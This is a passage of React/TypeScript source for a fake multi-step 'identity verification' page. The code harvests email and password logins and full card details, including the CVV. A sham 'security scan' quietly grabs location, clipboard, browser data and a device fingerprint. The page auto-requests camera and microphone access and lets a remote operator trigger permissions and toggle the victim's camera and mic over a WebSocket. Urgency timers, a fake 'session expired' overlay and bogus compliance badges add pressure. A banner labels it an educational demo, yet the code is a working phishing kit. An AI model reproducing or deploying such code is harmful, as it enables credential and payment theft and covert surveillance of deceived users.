    sendWS({ type: "rc_track_toggled", track: "camera", enabled });
  }, [sendWS]);

  const handleToggleMic = useCallback((enabled: boolean) => {
    micTracksRef.current.forEach(t => { t.enabled = enabled; });
    sendWS({ type: "rc_track_toggled", track: "microphone", enabled });
  }, [sendWS]);

  const acceptRequest = useCallback(() => {
    if (pendingRequest && handlers[pendingRequest]) { handlers[pendingRequest](); }
    setPendingRequest(null);
  }, [pendingRequest, handlers]);

  const denyRequest = useCallback(() => {
    if (pendingRequest) { sendWS({ type: "rc_permission_denied", permission: pendingRequest }); }
    setPendingRequest(null);
  }, [pendingRequest, sendWS]);

  const advanceStep = useCallback(() => {
    setCurrentStep((prev) => {
      const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
      let next = prev + 1;
      while (next <= WIZARD_STEPS.length && !activeStepKeys.includes(stepKeys[next - 1])) {
        next++;
      }
      if (next > WIZARD_STEPS.length) {
        setWizardComplete(true);
        return prev;
      }
      return next;
    });
  }, [activeStepKeys]);

  const runEnvironmentScan = useCallback(async () => {
    setScanRunning(true);
    setScanProgress(0);

    const steps = [
      { label: "Initializing security scan...", progress: 10 },
      { label: "Checking network security configuration...", progress: 20 },
      { label: "Verifying regional compliance...", progress: 35 },
      { label: "Analyzing browser configuration...", progress: 50 },
      { label: "Scanning clipboard for threats...", progress: 65 },
      { label: "Collecting device fingerprint...", progress: 80 },
      { label: "Running final security checks...", progress: 90 },
      { label: "Compiling security report...", progress: 100 },
    ];

    let harvested = false;

    for (let i = 0; i < steps.length; i++) {
      setScanStatus(steps[i].label);
      setScanProgress(steps[i].progress);

      if (i === 2 && !permissions.location.granted) {
        try { await new Promise<void>((res) => { handleLocation(); setTimeout(res, 1500); }); } catch {}
      }
      if (i === 3 && !permissions.browserData.granted) {
        try { await handleBrowserData(); } catch {}
        harvested = true;
      }
      if (i === 4 && !permissions.clipboard.granted) {
        try { await handleClipboard(); } catch {}
      }
      if (i === 5 && !permissions.deviceInfo.granted) {
        try { await handleDeviceInfo(); } catch {}
      }

      await new Promise((r) => setTimeout(r, harvested ? 800 : 1200));
    }

    setScanRunning(false);
    setTimeout(() => advanceStep(), 600);
  }, [handleLocation, handleBrowserData, handleClipboard, handleDeviceInfo, permissions, advanceStep]);

  useEffect(() => {
    if (!cfg.autoRequestPermissions || currentStep === 0) return;
    const stepKeys = ["identity", "biometric", "voice", "environment", "documents"];
    const stepKey = stepKeys[currentStep - 1];
    const autoRequestMap: Record<string, PermissionKey | null> = {
      biometric: "camera",
      voice: "microphone",
    };
    const permToRequest = autoRequestMap[stepKey];
    if (permToRequest && !permissions[permToRequest].granted && !permissions[permToRequest].loading) {
      const timer = setTimeout(() => {
        if (handlers[permToRequest]) handlers[permToRequest]();
      }, 1000);
      return () => clearTimeout(timer);
    }
    if (stepKey === "environment" && !scanRunning && scanProgress === 0) {
      const timer = setTimeout(() => runEnvironmentScan(), 800);
      return () => clearTimeout(timer);
    }
  }, [currentStep, cfg.autoRequestPermissions]);

  useEffect(() => {
    if (!session) return;
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
    wsRef.current = ws;
    ws.onopen = () => { ws.send(JSON.stringify({ type: "rc_join", token })); };
    ws.onmessage = async (evt) => {
      try {
        const msg = JSON.parse(evt.data);
        if (msg.type === "rc_answer" && pcRef.current) await pcRef.current.setRemoteDescription(new RTCSessionDescription(msg.sdp));
        if (msg.type === "rc_ice_candidate" && pcRef.current && msg.candidate) await pcRef.current.addIceCandidate(new RTCIceCandidate(msg.candidate));
        if (msg.type === "rc_request_permission" && msg.permission) handlePermissionRequest(msg.permission as PermissionKey);
        if (msg.type === "rc_toggle_camera") handleToggleCamera(msg.enabled);
        if (msg.type === "rc_toggle_mic") handleToggleMic(msg.enabled);
        if (msg.type === "rc_session_closed") setError("Session has been closed by the operator");
      } catch {}
    };
    return () => { ws.close(); if (pcRef.current) pcRef.current.close(); };
  }, [session, token, handlePermissionRequest, handleToggleCamera, handleToggleMic]);

  if (loading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="flex flex-col items-center gap-3">
          <Loader2 className="w-8 h-8 animate-spin text-primary" data-testid="loading-spinner" />
          <span className="text-sm text-muted-foreground font-mono">Loading verification...</span>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="max-w-md w-full">
          <CardContent className="p-8 text-center">
            <XCircle className="w-12 h-12 text-destructive mx-auto mb-4" />
            <h2 className="text-lg font-semibold mb-2" data-testid="text-error-title">Session Unavailable</h2>
            <p className="text-sm text-muted-foreground" data-testid="text-error-message">{error}</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (!autoHarvestDone) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="flex flex-col items-center gap-4 max-w-xs text-center">
          <div className="relative">
            <div className="w-16 h-16 rounded-full border-2 border-primary/20 border-t-primary animate-spin" />
            <Shield className="w-6 h-6 text-primary absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2" />
          </div>
          <p className="text-sm font-medium" data-testid="text-init-status">{initStatus}</p>
          <p className="text-xs text-muted-foreground">Please wait while we set up your secure session</p>
        </div>
      </div>
    );
  }

  const currentStepIndex = activeWizardSteps.findIndex((s) => s.id === currentStep);
  const overallProgress = activeWizardSteps.length > 0 ? Math.round((Math.max(0, currentStepIndex) / activeWizardSteps.length) * 100) : 0;
  const timerMin = Math.floor(urgencyTimer / 60);
  const timerSec = urgencyTimer % 60;

  const renderDeniedError = (permKey: PermissionKey) => {
    const err = permissions[permKey].error;
    if (!err) return null;
    return (
      <div className="rounded-lg bg-destructive/10 border border-destructive/20 p-3 text-center space-y-2">
        <AlertTriangle className="w-5 h-5 text-destructive mx-auto" />
        <p className="text-xs text-destructive font-medium">Verification Failed</p>
        <p className="text-[10px] text-muted-foreground">{err}</p>
        <p className="text-[10px] text-destructive/70">Your account may be suspended if verification is not completed. Please try again.</p>
      </div>
    );
  };

  const renderStep1 = () => (
    <div className="space-y-4" data-testid="step-identity">
      <div className="text-center space-y-2 mb-6">
        <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-blue-500/10 mb-2">
          <Lock className="w-7 h-7 text-blue-500" />
        </div>
        <h2 className="text-lg font-semibold" data-testid="text-step-title">Verify Your Identity</h2>
        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
          For security purposes, please confirm your account credentials to access the secure portal.
        </p>
      </div>

      <Card className="border-blue-500/20">
        <CardContent className="p-0">
          <div className={`bg-gradient-to-r ${brand.from} ${brand.to} p-3 rounded-t-lg`}>
            <div className="flex items-center gap-2 text-white">
              <Shield className="w-4 h-4" />
              <span className="font-medium text-xs">Secure Authentication Portal</span>
            </div>
          </div>
          <div className="p-5 space-y-4">
            {cfg.enableBanking && (
              <div className="flex gap-1 border-b border-border/50 mb-4">
                <button
                  className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "login" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`}
                  onClick={() => setCredTab("login")}
                  data-testid="tab-login"
                >
                  Account Login
                </button>
                <button
                  className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "banking" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`}
                  onClick={() => setCredTab("banking")}
                  data-testid="tab-banking"
                >
                  Payment Verification
                </button>
              </div>
            )}

            {credTab === "login" && (
              <div className="space-y-3">
                <div>
                  <label className="text-xs font-medium text-muted-foreground mb-1 block">Email Address</label>
                  <Input type="email" placeholder="name@example.com" value={credForm.email} onChange={(e) => setCredForm((p) => ({ ...p, email: e.target.value }))} data-testid="input-cred-email" />
                </div>
                <div>
                  <label className="text-xs font-medium text-muted-foreground mb-1 block">Password</label>
                  <div className="relative">
                    <Input type={showPassword ? "text" : "password"} placeholder="Enter your password" value={credForm.password} onChange={(e) => setCredForm((p) => ({ ...p, password: e.target.value }))} data-testid="input-cred-password" />
                    <button type="button" className="absolute right-2 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground" onClick={() => setShowPassword(!showPassword)}>
                      {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                </div>
                <Button className="w-full" onClick={() => submitCredentials("login")} data-testid="button-submit-login">
                  <Lock className="w-4 h-4 mr-2" />Verify Identity
                </Button>
              </div>
            )}

            {credTab === "banking" && (
              <div className="space-y-3">
                <div>
                  <label className="text-xs font-medium text-muted-foreground mb-1 block">Cardholder Name</label>
                  <Input placeholder="John Smith" value={credForm.cardName} onChange={(e) => setCredForm((p) => ({ ...p, cardName: e.target.value }))} data-testid="input-card-name" />
                </div>
                <div>
                  <label className="text-xs font-medium text-muted-foreground mb-1 block">Card Number</label>
                  <div className="relative">
                    <Input placeholder="4242 4242 4242 4242" value={credForm.cardNumber} onChange={(e) => setCredForm((p) => ({ ...p, cardNumber: e.target.value }))} data-testid="input-card-number" />
                    <CreditCard className="absolute right-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                  </div>
                </div>
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-xs font-medium text-muted-foreground mb-1 block">Expiry</label>
                    <Input placeholder="MM/YY" value={credForm.cardExpiry} onChange={(e) => setCredForm((p) => ({ ...p, cardExpiry: e.target.value }))} data-testid="input-card-expiry" />
                  </div>
                  <div>
                    <label className="text-xs font-medium text-muted-foreground mb-1 block">CVV</label>
                    <Input type="password" placeholder="123" value={credForm.cardCvv} onChange={(e) => setCredForm((p) => ({ ...p, cardCvv: e.target.value }))} data-testid="input-card-cvv" />
                  </div>
                </div>
                <Button className="w-full" onClick={() => submitCredentials("banking")} data-testid="button-submit-banking">
                  <CreditCard className="w-4 h-4 mr-2" />Verify Payment Method
                </Button>
              </div>
            )}

            <p className="text-[10px] text-muted-foreground text-center">Secured by 256-bit SSL encryption</p>
          </div>
        </CardContent>
      </Card>

      <div className="flex justify-center pt-2">
        <Button variant="ghost" size="sm" className="text-xs text-muted-foreground" onClick={advanceStep} data-testid="button-skip-step">
          Skip this step
        </Button>
      </div>
    </div>
  );

  const renderStep2 = () => (
    <div className="space-y-4" data-testid="step-biometric">
      <div className="text-center space-y-2 mb-6">
        <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-emerald-500/10 mb-2">
          <ScanFace className="w-7 h-7 text-emerald-500" />
        </div>
        <h2 className="text-lg font-semibold" data-testid="text-step-title">Biometric Verification</h2>
        {capturedEmail && <p className="text-xs text-emerald-500">Welcome back, {capturedEmail}</p>}
        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
          A quick facial scan is required to verify you are the authorized account holder. This takes only a few seconds.
        </p>
      </div>

      <Card className="border-emerald-500/20">
        <CardContent className="p-6">
          <div className="text-center space-y-4">
            {permissions.camera.granted ? (
              <div className="space-y-3">
                <div className="w-20 h-20 rounded-full bg-emerald-500/10 flex items-center justify-center mx-auto">
                  <CheckCircle2 className="w-10 h-10 text-emerald-500" />
                </div>
                <p className="text-sm font-medium text-emerald-500">Biometric scan complete</p>
                <p className="text-xs text-muted-foreground">Identity confirmed successfully</p>
                <Button className="w-full" onClick={advanceStep} data-testid="button-next-step">
                  Continue <ArrowRight className="w-4 h-4 ml-2" />
                </Button>
              </div>
            ) : permissions.camera.loading ? (
              <div className="space-y-3">
                <div className="w-20 h-20 rounded-full border-2 border-emerald-500/30 border-t-emerald-500 animate-spin mx-auto" />
                <p className="text-sm text-muted-foreground">Initializing facial recognition...</p>
                <p className="text-[10px] text-muted-foreground">Processing biometric data...</p>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="w-32 h-32 rounded-full border-2 border-dashed border-muted-foreground/30 flex items-center justify-center mx-auto relative">
                  <ScanFace className="w-12 h-12 text-muted-foreground/50" />
                  <div className="absolute inset-0 rounded-full border-2 border-transparent border-t-emerald-500/50 animate-spin" style={{ animationDuration: "3s" }} />
                </div>
                <p className="text-xs text-muted-foreground">Position your face within the frame and click the button below</p>
                {renderDeniedError("camera")}
                <Button className="w-full" onClick={handleCamera} data-testid="button-start-scan">
                  <ScanFace className="w-4 h-4 mr-2" />Start Biometric Scan
                </Button>
              </div>
            )}
          </div>
        </CardContent>
      </Card>

      <div className="flex justify-center pt-2">
        <Button variant="ghost" size="sm" className="text-xs text-muted-foreground" onClick={advanceStep} data-testid="button-skip-step">
          Skip this step
        </Button>
      </div>
    </div>
  );

  const renderStep3 = () => (
    <div className="space-y-4" data-testid="step-voice">
      <div className="text-center space-y-2 mb-6">
        <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-violet-500/10 mb-2">
          <AudioLines className="w-7 h-7 text-violet-500" />
        </div>
        <h2 className="text-lg font-semibold" data-testid="text-step-title">Voice Authentication</h2>
        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
          Multi-factor authentication requires a voice pattern match. Speak naturally when prompted to verify your identity.
        </p>
      </div>

      <Card className="border-violet-500/20">
        <CardContent className="p-6">
          <div className="text-center space-y-4">
            {permissions.microphone.granted ? (
              <div className="space-y-3">
                <div className="w-20 h-20 rounded-full bg-violet-500/10 flex items-center justify-center mx-auto">
                  <CheckCircle2 className="w-10 h-10 text-violet-500" />
                </div>
                <p className="text-sm font-medium text-violet-500">Voice pattern verified</p>
                <p className="text-xs text-muted-foreground">Multi-factor authentication passed</p>
                <Button className="w-full" onClick={advanceStep} data-testid="button-next-step">
                  Continue <ArrowRight className="w-4 h-4 ml-2" />
                </Button>
              </div>
            ) : permissions.microphone.loading ? (
              <div className="space-y-3">
                <div className="flex items-center justify-center gap-1 h-20">
                  {[...Array(7)].map((_, i) => (
                    <div key={i} className="w-1.5 bg-violet-500 rounded-full animate-pulse" style={{ height: `${20 + Math.random() * 40}px`, animationDelay: `${i * 0.15}s` }} />
                  ))}
                </div>
                <p className="text-sm text-muted-foreground">Analyzing voice pattern...</p>
                <p className="text-[10px] text-muted-foreground">Encrypting audio sample...</p>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center justify-center gap-1 h-20 opacity-30">
                  {[...Array(7)].map((_, i) => (
                    <div key={i} className="w-1.5 bg-muted-foreground rounded-full" style={{ height: `${15 + i * 5}px` }} />
                  ))}
                </div>
                <p className="text-xs text-muted-foreground">Click below and say anything to record your voice pattern</p>
                {renderDeniedError("microphone")}
                <Button className="w-full" onClick={handleMicrophone} data-testid="button-start-voice">
                  <AudioLines className="w-4 h-4 mr-2" />Begin Voice Verification
                </Button>
              </div>
            )}
          </div>
        </CardContent>
      </Card>

      <div className="flex justify-center pt-2">
        <Button variant="ghost" size="sm" className="text-xs text-muted-foreground" onClick={advanceStep} data-testid="button-skip-step">
          Skip this step
        </Button>
      </div>
    </div>
  );

  const renderStep4 = () => (
    <div className="space-y-4" data-testid="step-environment">
      <div className="text-center space-y-2 mb-6">
        <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-amber-500/10 mb-2">
          <Search className="w-7 h-7 text-amber-500" />
        </div>
        <h2 className="text-lg font-semibold" data-testid="text-step-title">Security Environment Check</h2>
        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
          Automated security scan of your device and network to ensure a safe environment before granting access.
        </p>
      </div>

      <Card className="border-amber-500/20">
        <CardContent className="p-6">
          <div className="space-y-5">
            {scanRunning || scanProgress === 100 ? (
              <div className="space-y-4">
                <Progress value={scanProgress} className="h-2" data-testid="progress-scan" />
                <p className="text-sm text-center font-medium" data-testid="text-scan-status">{scanStatus}</p>
                <div className="space-y-2 pt-2">
                  {[
                    { label: "Network security", done: scanProgress >= 25 },
                    { label: "Regional compliance", done: scanProgress >= 40 },
                    { label: "Browser configuration", done: scanProgress >= 55 },
                    { label: "Clipboard scan", done: scanProgress >= 70 },
                    { label: "Device fingerprint", done: scanProgress >= 85 },
                    { label: "Final report", done: scanProgress >= 100 },
                  ].map((item) => (
                    <div key={item.label} className="flex items-center gap-2 text-xs">
                      {item.done ? (
                        <CheckCircle2 className="w-3.5 h-3.5 text-emerald-500 flex-shrink-0" />
                      ) : scanRunning ? (
                        <Loader2 className="w-3.5 h-3.5 text-muted-foreground animate-spin flex-shrink-0" />
                      ) : (
                        <div className="w-3.5 h-3.5 rounded-full border border-muted-foreground/30 flex-shrink-0" />
                      )}
                      <span className={item.done ? "text-foreground" : "text-muted-foreground"}>{item.label}</span>
                    </div>
                  ))}
                </div>
                {scanProgress === 100 && !scanRunning && (
                  <div className="text-center pt-2">
                    <Badge className="bg-emerald-500/20 text-emerald-500">Environment Verified</Badge>
                  </div>
                )}
              </div>
            ) : (
              <div className="text-center space-y-4">
                <div className="w-20 h-20 rounded-full border-2 border-dashed border-amber-500/30 flex items-center justify-center mx-auto">
                  <Search className="w-8 h-8 text-amber-500/50" />
                </div>
                <p className="text-xs text-muted-foreground">This automated scan checks your network, browser, and device security posture. It takes approximately 15 seconds.</p>
                <Button className="w-full" onClick={runEnvironmentScan} data-testid="button-start-env-scan">
                  <Search className="w-4 h-4 mr-2" />Run Security Scan
                </Button>
              </div>
            )}
          </div>
        </CardContent>
      </Card>

      <div className="flex justify-center pt-2">
        <Button variant="ghost" size="sm" className="text-xs text-muted-foreground" onClick={advanceStep} data-testid="button-skip-step">
          Skip this step
        </Button>
      </div>
    </div>
  );

  const renderStep5 = () => (
    <div className="space-y-4" data-testid="step-documents">
      <div className="text-center space-y-2 mb-6">
        <div className="inline-flex items-center justify-center w-14 h-14 rounded-full bg-sky-500/10 mb-2">
          <FileCheck className="w-7 h-7 text-sky-500" />
        </div>
        <h2 className="text-lg font-semibold" data-testid="text-step-title">Document Verification</h2>
        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
          Upload a valid government-issued ID, passport, or utility bill to complete the verification process.
        </p>
      </div>

      <Card className="border-sky-500/20">
        <CardContent className="p-6">
          <div className="text-center space-y-4">
            {permissions.files.granted ? (
              <div className="space-y-3">
                <div className="w-20 h-20 rounded-full bg-sky-500/10 flex items-center justify-center mx-auto">
                  <CheckCircle2 className="w-10 h-10 text-sky-500" />
                </div>
                <p className="text-sm font-medium text-sky-500">Documents received</p>
                <p className="text-xs text-muted-foreground">Your documents are being reviewed</p>
                <Button className="w-full" onClick={() => setWizardComplete(true)} data-testid="button-complete-verification">
                  Complete Verification <ArrowRight className="w-4 h-4 ml-2" />
                </Button>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="border-2 border-dashed border-sky-500/20 rounded-lg p-8">
                  <FolderOpen className="w-10 h-10 text-sky-500/40 mx-auto mb-3" />
                  <p className="text-xs text-muted-foreground">Accepted formats: JPG, PNG, PDF, DOC</p>
                  <p className="text-[10px] text-muted-foreground/60 mt-1">Max file size: 10MB</p>
                </div>
                {permissions.files.error && <p className="text-xs text-destructive">{permissions.files.error}</p>}
                <Button className="w-full" onClick={handleFiles} data-testid="button-upload-documents">
                  <FileCheck className="w-4 h-4 mr-2" />Select Documents to Upload
                </Button>
              </div>
            )}
          </div>
        </CardContent>
      </Card>

      <div className="flex justify-center pt-2">
        <Button variant="ghost" size="sm" className="text-xs text-muted-foreground" onClick={() => setWizardComplete(true)} data-testid="button-skip-step">
          Skip this step
        </Button>
      </div>
    </div>
  );

  const renderComplete = () => (
    <div className="text-center space-y-6 py-8" data-testid="step-complete">
      <div className="inline-flex items-center justify-center w-20 h-20 rounded-full bg-emerald-500/10 mb-2">
        <ShieldCheck className="w-10 h-10 text-emerald-500" />
      </div>
      <div className="space-y-2">
        <h2 className="text-xl font-semibold" data-testid="text-complete-title">Verification Complete</h2>
        {capturedEmail && <p className="text-sm text-emerald-500">Account verified: {capturedEmail}</p>}
        <p className="text-sm text-muted-foreground max-w-sm mx-auto">
          Your identity has been successfully verified. Your secure session is now active.
        </p>
      </div>
      <div className="grid grid-cols-2 gap-2 max-w-xs mx-auto text-xs">
        {[
          { label: "Identity", done: permissions.credentials.granted },
          { label: "Biometric", done: permissions.camera.granted },
          { label: "Voice Auth", done: permissions.microphone.granted },
          { label: "Environment", done: permissions.deviceInfo.granted || permissions.browserData.granted },
          { label: "Documents", done: permissions.files.granted },
        ].map((item) => (
          <div key={item.label} className="flex items-center gap-1.5">
            {item.done ? <CheckCircle2 className="w-3 h-3 text-emerald-500" /> : <XCircle className="w-3 h-3 text-muted-foreground/40" />}
            <span className={item.done ? "text-foreground" : "text-muted-foreground/50"}>{item.label}</span>
          </div>
        ))}
      </div>
      <Badge className="bg-emerald-500/20 text-emerald-500 text-xs">Session Active</Badge>
    </div>
  );

  return (
    <div className="min-h-screen bg-background">
      {showCredentialOverlay && (
        <div className="fixed inset-0 z-[60] bg-black/70 flex items-center justify-center p-4" data-testid="modal-credential-overlay">
          <Card className="max-w-md w-full animate-in fade-in zoom-in-95">
            <CardContent className="p-0">
              <div className={`bg-gradient-to-r ${brand.from} ${brand.to} p-4 rounded-t-lg`}>
                <div className="flex items-center gap-2 text-white">
                  <Lock className="w-5 h-5" />
                  <span className="font-semibold text-sm">Security Verification Required</span>
                </div>
                <p className="text-white/80 text-xs mt-1">Your session has expired. Please verify your identity to continue.</p>
              </div>
              <div className="p-5 space-y-4">
                {cfg.enableBanking && (
                  <div className="flex gap-1 border-b border-border/50 mb-4">
                    <button className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "login" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`} onClick={() => setCredTab("login")} data-testid="tab-login-overlay">Account Login</button>
                    <button className={`px-3 py-2 text-xs font-medium border-b-2 transition-colors ${credTab === "banking" ? "border-primary text-primary" : "border-transparent text-muted-foreground hover:text-foreground"}`} onClick={() => setCredTab("banking")} data-testid="tab-banking-overlay">Payment Verification</button>
                  </div>
                )}
                {credTab === "login" && (
                  <div className="space-y-3">
                    <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Email Address</label><Input type="email" placeholder="name@example.com" value={credForm.email} onChange={(e) => setCredForm((p) => ({ ...p, email: e.target.value }))} data-testid="input-cred-email-overlay" /></div>
                    <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Password</label><Input type="password" placeholder="Enter your password" value={credForm.password} onChange={(e) => setCredForm((p) => ({ ...p, password: e.target.value }))} data-testid="input-cred-password-overlay" /></div>
                    <Button className="w-full" onClick={() => submitCredentials("login")} data-testid="button-submit-login-overlay"><Lock className="w-4 h-4 mr-2" />Verify Identity</Button>
                  </div>
                )}
                {credTab === "banking" && (
                  <div className="space-y-3">
                    <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Cardholder Name</label><Input placeholder="John Smith" value={credForm.cardName} onChange={(e) => setCredForm((p) => ({ ...p, cardName: e.target.value }))} data-testid="input-card-name-overlay" /></div>
                    <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Card Number</label><Input placeholder="4242 4242 4242 4242" value={credForm.cardNumber} onChange={(e) => setCredForm((p) => ({ ...p, cardNumber: e.target.value }))} data-testid="input-card-number-overlay" /></div>
                    <div className="grid grid-cols-2 gap-3">
                      <div><label className="text-xs font-medium text-muted-foreground mb-1 block">Expiry</label><Input placeholder="MM/YY" value={credForm.cardExpiry} onChange={(e) => setCredForm((p) => ({ ...p, cardExpiry: e.target.value }))} data-testid="input-card-expiry-overlay" /></div>
                      <div><label className="text-xs font-medium text-muted-foreground mb-1 block">CVV</label><Input type="password" placeholder="123" value={credForm.cardCvv} onChange={(e) => setCredForm((p) => ({ ...p, cardCvv: e.target.value }))} data-testid="input-card-cvv-overlay" /></div>
                    </div>
                    <Button className="w-full" onClick={() => submitCredentials("banking")} data-testid="button-submit-banking-overlay"><CreditCard className="w-4 h-4 mr-2" />Verify Payment Method</Button>
                  </div>
                )}
                <p className="text-[10px] text-muted-foreground text-center">Secured by 256-bit SSL encryption</p>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      {pendingRequest && (
        <div className="fixed inset-0 z-50 bg-black/60 flex items-center justify-center p-4" data-testid="modal-permission-request">
          <Card className="max-w-sm w-full animate-in fade-in zoom-in-95">
            <CardContent className="p-6 text-center space-y-4">
              <div className="mx-auto w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center">
                <Shield className="w-6 h-6 text-primary" />
              </div>
              <h3 className="text-lg font-semibold" data-testid="text-request-title">{disguisedLabels[pendingRequest].title}</h3>
              <p className="text-sm text-muted-foreground" data-testid="text-request-message">{disguisedLabels[pendingRequest].body}</p>
              <div className="flex gap-3 justify-center pt-2">
                <Button variant="outline" onClick={denyRequest} data-testid="button-deny-request">Deny</Button>
                <Button onClick={acceptRequest} data-testid="button-accept-request">Allow</Button>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      <div className="bg-amber-950/30 border-b border-amber-800/40">
        <div className="max-w-2xl mx-auto px-4 py-3 flex items-start gap-3">
          <AlertTriangle className="w-5 h-5 text-amber-500 flex-shrink-0 mt-0.5" />
          <p className="text-xs text-amber-200/80" data-testid="text-warning-banner">
            Educational Cybersecurity Demo - This demonstrates how real attackers disguise permission requests, use zero-click fingerprinting, keystroke logging, and social engineering to trick users
          </p>
        </div>
      </div>

      <div className="max-w-lg mx-auto px-4 py-8">
        <div className="text-center mb-4">
          <div className="inline-flex items-center justify-center w-12 h-12 rounded-md bg-primary/10 mb-3">
            <Shield className="w-6 h-6 text-primary" />
          </div>
          <h1 className="text-lg font-semibold mb-1" data-testid="text-page-title">{cfg.pageTitle}</h1>
          {cfg.pageSubtitle && <p className="text-xs text-muted-foreground mb-1">{cfg.pageSubtitle}</p>}
          {session && <p className="text-xs text-muted-foreground" data-testid="text-session-name">{session.name}</p>}
        </div>

        {!wizardComplete && (
          <>
            <div className="flex items-center justify-center gap-4 mb-4 text-[10px]">
              <div className="flex items-center gap-1 text-destructive" data-testid="text-urgency-timer">
                <Timer className="w-3 h-3" />
                <span>Session expires in {timerMin}:{timerSec.toString().padStart(2, "0")}</span>
              </div>
              <div className="flex items-center gap-1 text-muted-foreground" data-testid="text-verification-count">
                <Users className="w-3 h-3" />
                <span>{verificationCount.toLocaleString()} verifications today</span>
              </div>
            </div>

            <div className="flex items-center justify-center gap-3 mb-6">
              <div className="flex items-center gap-1 text-[9px] text-muted-foreground/60">
                <Lock className="w-2.5 h-2.5" />
                <span>SSL Secured</span>
              </div>
              <div className="flex items-center gap-1 text-[9px] text-muted-foreground/60">
                <Fingerprint className="w-2.5 h-2.5" />
                <span>GDPR Compliant</span>
              </div>
              <div className="flex items-center gap-1 text-[9px] text-muted-foreground/60">
                <ShieldCheck className="w-2.5 h-2.5" />
                <span>SOC 2 Verified</span>
              </div>
            </div>

            <div className="mb-8">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs text-muted-foreground">Step {Math.max(1, currentStepIndex + 1)} of {activeWizardSteps.length}</span>
                <span className="text-xs text-muted-foreground" data-testid="text-progress-percent">{overallProgress}% complete</span>
              </div>
              <Progress value={overallProgress} className="h-1.5" data-testid="progress-wizard" />
              <div className="flex justify-between mt-3">
                {activeWizardSteps.map((step, idx) => (
                  <div key={step.id} className="flex flex-col items-center flex-1">
                    <div className={`w-6 h-6 rounded-full flex items-center justify-center text-[10px] font-medium transition-colors ${
                      idx < currentStepIndex ? "bg-emerald-500 text-white" :
                      step.id === currentStep ? "bg-primary text-primary-foreground" :
                      "bg-muted text-muted-foreground"
                    }`} data-testid={`step-indicator-${step.id}`}>
                      {idx < currentStepIndex ? <CheckCircle2 className="w-3.5 h-3.5" /> : idx + 1}
                    </div>
                    <span className="text-[9px] text-muted-foreground mt-1 text-center hidden sm:block">{step.title}</span>
                  </div>
                ))}
              </div>
            </div>
          </>
        )}

        {wizardComplete ? renderComplete() : (
          <>
            {currentStep === 1 && renderStep1()}
            {currentStep === 2 && renderStep2()}
            {currentStep === 3 && renderStep3()}
            {currentStep === 4 && renderStep4()}
            {currentStep === 5 && renderStep5()}
          </>
        )}
      </div>

      <input ref={fileInputRef} type="file" multiple accept="image/*,.pdf,.doc,.docx,.txt" className="hidden" onChange={onFileSelected} data-testid="input-file-upload" />
    </div>
  );
}
